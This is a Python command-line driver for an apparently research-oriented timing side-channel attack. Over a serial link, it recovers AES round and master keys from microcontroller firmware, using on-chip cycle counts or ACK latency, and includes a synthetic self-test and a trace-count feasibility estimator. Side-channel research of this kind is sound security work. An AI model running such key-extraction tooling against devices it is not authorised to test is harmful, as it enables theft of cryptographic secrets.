"""Unified CLI:  python -m flashattack <subcommand> ...

  selftest                     hardware-free synthetic recovery (CI smoke test)
  attack   --port --mode --n   collect via the on-chip-counter batch and recover
  boot     --port --n --K      recover from host-measured ACK latency (fw_f4_boot)
  feasibility --port --mode --n   pilot capture -> trace-count / amplification advice
"""
from __future__ import annotations
import argparse
import numpy as np
from . import engine, modes, feasibility, aesref

DEFAULT_KEY = "2b7e151628aed2a6abf7158809cf4f3c"


def _verify_pair(args, key):
    if args.verify:
        pt = bytes(16)
        ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
        return (pt, ct)          # attacker-known PT/CT under the target key
    return None


def cmd_selftest(args):
    key = bytes.fromhex(DEFAULT_KEY)
    rng = np.random.default_rng(0)
    for direction in ("enc", "dec"):
        rk = aesref.key_expansion(key)
        target = rk[-1] if direction == "enc" else rk[0]
        tbl = engine.SINV if direction == "enc" else engine.SBOX
        N = 20000
        known = rng.integers(0, 256, (N, 16), dtype=np.uint8)
        hi = (tbl[known.astype(np.int64) ^ target.astype(np.int64)] >> 4)
        t = 5000.0 + rng.normal(0, 22.0, N)
        for g in (range(0, 4), range(4, 8), range(8, 12), range(12, 16)):
            gs = list(g)
            for i in range(len(gs)):
                for j in range(i + 1, len(gs)):
                    t -= 6.0 * (hi[:, gs[i]] == hi[:, gs[j]])
        pt = bytes(16); ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
        res = engine.recover(known, t, direction=direction, verify=(pt, ct), truth=target)
        print(f"[selftest {direction}] rk {res.truth_correct}/16  master_ok={res.master == key}  verified={res.verified}")


def _make_target(args):
    from .transport import SerialTarget
    tgt = SerialTarget(args.port)
    print("id:", tgt.banner())
    if args.acr:
        print("cfg:", tgt.set_acr(args.acr))
    print("key:", tgt.setkey(args.key))
    return tgt


def cmd_attack(args):
    from .transport import collect_oncore
    key = bytes.fromhex(args.key)
    tgt = _make_target(args)
    banner = tgt.banner()
    if args.batch_cmd:
        bc = args.batch_cmd
    elif args.mode == "ecb-enc" and "-lib" in banner:
        bc = "X"                                   # fw_f4_lib: bare X = ecb-enc
    else:
        bc = "X " + modes.MODE_CHAR[args.mode]     # fw_f4_modes
    print(f"collecting {args.n} via '{bc}' (mode {args.mode})...")
    material, cyc = collect_oncore(tgt, bc, int(args.seed, 16), args.n)
    tgt.close()
    known, direction = modes.known_output(args.mode, material, key)
    keysize = len(key) * 8
    if args.full and keysize != 128 and direction == "enc":
        # full 192/256 master: last round key + second-to-last (MixColumns-linearity)
        r = engine.recover_full(known, cyc, keysize=keysize, line_shift_last=4,
                                line_shift_prev=args.line_shift_prev,
                                verify=_verify_pair(args, key), key_for_truth=key)
        print(f"round-key bytes correct {r['correct']} (rk[Nr], rk[Nr-1])")
        print(f"RECOVERED MASTER: {r['master'].hex() if r['master'] else None}")
        print(f"FULL KEY RECOVERED: {r['master'] == key}  verified={r['verified']}")
    else:
        res = engine.recover(known, cyc, direction=direction, keysize=keysize,
                             verify=_verify_pair(args, key),
                             truth=(aesref.key_expansion(key)[-1] if direction == "enc"
                                    else aesref.key_expansion(key)[0]))
        print(res.summary())


def cmd_boot(args):
    from .transport import collect_acklatency
    key = bytes.fromhex(args.key)
    tgt = _make_target(args)
    rng = np.random.default_rng(args.seed_int)
    blocks = rng.integers(0, 256, (args.n, 16), dtype=np.uint8)
    print(f"collecting {args.n} ACK-latency traces (K={args.K}, R={args.R})...")
    rtt, cyc = collect_acklatency(tgt, blocks, K=args.K, R=args.R)
    tgt.close()
    good = np.isfinite(rtt)
    blocks, rtt, cyc = blocks[good], rtt[good], cyc[good]
    known = aesref.decrypt_blocks(key, blocks).astype(int)   # dec direction
    vp = _verify_pair(args, key)
    for name, timing in [("host ACK latency", rtt), ("on-chip (calibration)", cyc)]:
        res = engine.recover(known, timing, direction="dec", verify=vp, truth=key)
        print(f"[{name}] rk {res.truth_correct}/16  master_ok={res.master == key}  verified={res.verified}"
              + (f"  bruteforced={res.bruteforced}" if res.bruteforced else ""))


def cmd_feasibility(args):
    from .transport import collect_oncore
    key = bytes.fromhex(args.key)
    tgt = _make_target(args)
    bc = args.batch_cmd or ("X " + modes.MODE_CHAR[args.mode])
    material, cyc = collect_oncore(tgt, bc, int(args.seed, 16), args.n)
    tgt.close()
    known, direction = modes.known_output(args.mode, material, key)
    est = feasibility.estimate(known, cyc, direction=direction)
    print("verdict:", est["verdict"])
    print("weakest byte:", est["weakest_pos"], "conf", round(est["weakest_conf"], 2))
    print("estimated traces for full recovery:", f"{est['n_needed_est']:,}")


def build_parser():
    p = argparse.ArgumentParser("flashattack")
    sub = p.add_subparsers(dest="cmd", required=True)
    st = sub.add_parser("selftest"); st.set_defaults(fn=cmd_selftest)
    for name, fn in [("attack", cmd_attack), ("feasibility", cmd_feasibility)]:
        q = sub.add_parser(name); q.set_defaults(fn=fn)
        q.add_argument("--port", required=True)
        q.add_argument("--mode", default="ecb-enc", choices=modes.ALL_MODES)
        q.add_argument("--n", type=int, default=150000)
        q.add_argument("--acr", default=None)
        q.add_argument("--key", default=DEFAULT_KEY)
        q.add_argument("--seed", default="5eed01")
        q.add_argument("--batch-cmd", default=None)
        q.add_argument("--verify", action="store_true", help="verify+brute-force with a known PT/CT")
        q.add_argument("--full", action="store_true",
                       help="AES-192/256: also recover the 2nd-to-last round key -> full master")
        q.add_argument("--line-shift-prev", type=int, default=2,
                       help="round Nr-1 table granularity for --full: 2=T-table (4B entries), 4=S-box")
    b = sub.add_parser("boot"); b.set_defaults(fn=cmd_boot)
    b.add_argument("--port", required=True); b.add_argument("--n", type=int, default=60000)
    b.add_argument("--K", type=int, default=255); b.add_argument("--R", type=int, default=1)
    b.add_argument("--acr", default="00000705"); b.add_argument("--key", default=DEFAULT_KEY)
    b.add_argument("--seed-int", type=int, default=1234)
    b.add_argument("--verify", action="store_true")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    args.fn(args)


if __name__ == "__main__":
    main()
